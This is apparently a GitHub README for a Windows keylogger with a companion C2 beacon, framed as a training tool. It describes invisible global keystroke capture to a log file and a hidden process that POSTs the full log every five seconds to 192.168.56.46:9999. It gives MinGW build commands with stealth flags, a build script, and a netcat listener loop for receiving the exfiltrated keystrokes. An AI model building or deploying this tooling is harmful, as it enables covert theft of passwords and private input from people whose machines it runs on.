# simple_keylogger
A complete parent-child C2 keylogger system designed for authorized cybersecurity training environments. Demonstrates realistic malware persistence, incremental logging, stealth execution, and automated exfiltration techniques.**

# Working Parts

Component	Size	Dependencies	Entry Point
pure_no_exit32.exe	~12KB	kernel32.dll, user32.dll	WinMain
halo_persistent32.exe	~18KB	kernel32.dll, user32.dll, wininet.dll	WinMain

pure_no_exit32.exe (Persistent Keylogger)
Global key capture using GetAsyncKeyState()

ENTER = Save log + first-time spawn halo_persistent32.exe + Continue

Continuous append logging to C:\Temp\log.log

Buffer overflow protection - auto-save at 255 chars

Completely invisible (-mwindows, no console)

Runs forever until manually terminated

halo_persistent32.exe (C2 Beacon)
Every 5 seconds: Read C:\Temp\log.log → POST to 192.168.56.46:9999

Parent-aware: Auto-exits when pure_no_exit32.exe terminates

Stealth execution - no console, hidden process

WinINet HTTP POST with full log transmission

# Ubuntu/Debian
sudo apt update
sudo apt install gcc-mingw-w64-i686 gcc-mingw-w64-x86-64 nasm-mingw-w64

# Verify installation
i686-w64-mingw32-gcc --version
x86_64-w64-mingw32-gcc --version
Runtime (Windows)
Windows 7+ (32-bit and 64-bit compatible)

Administrator privileges required for global key capture

Internet access to 192.168.56.46:9999 (sandbox C2 server)

C:\Temp writable directory

**Compilation Instructions**
pure_no_exit32.exe (Keylogger)
bash
# 32-bit (primary)
i686-w64-mingw32-gcc -m32 pure_no_exit.c -o pure_no_exit32.exe -lkernel32 -luser32 -mwindows -s -O2

# 64-bit  
x86_64-w64-mingw32-gcc pure_no_exit.c -o pure_no_exit64.exe -lkernel32 -luser32 -mwindows -s -O2
halo_persistent32.exe (C2 Beacon)
bash
# 32-bit (primary)
i686-w64-mingw32-gcc -m32 halo_persistent.c -o halo_persistent32.exe -lwininet -lkernel32 -luser32 -mwindows -s -O2

# 64-bit
x86_64-w64-mingw32-gcc halo_persistent.c -o halo_persistent64.exe -lwininet -lkernel32 -luser32 -mwindows -s -O2


**All-in-One Build Script**

# build.sh - Complete C2 toolkit
i686-w64-mingw32-gcc -m32 pure_no_exit.c -o pure_no_exit32.exe -lkernel32 -luser32 -mwindows -s -O2
i686-w64-mingw32-gcc -m32 halo_persistent.c -o halo_persistent32.exe -lwininet -lkernel32 -luser32 -mwindows -s -O2
echo "✅ Build complete: pure_no_exit32.exe + halo_persistent32.exe"

1. pure_no_exit32.exe (Run as Admin) → invisible background logging
2. Type keys globally → ENTER → log.log overwritten → halo_persistent32.exe spawned (hidden)
3. halo_persistent32.exe → every 5s: read FULL log.log → POST 192.168.56.46:9999
4. ENTER again → new log data → halo continues sending updated full log
5. pure_no_exit32.exe killed → halo_persistent32.exe auto-exits

1. pure_no_exit32.exe (Run as Admin) → invisible background logging
2. Type keys globally → ENTER → log.log overwritten → halo_persistent32.exe spawned (hidden)
3. halo_persistent32.exe → every 5s: read FULL log.log → POST 192.168.56.46:9999
4. ENTER again → new log data → halo continues sending updated full log
5. pure_no_exit32.exe killed → halo_persistent32.exe auto-exits

**C2 Server (Linux)**
# Listen for exfiltrated keystrokes
while :; do nc -l -p 9999; done
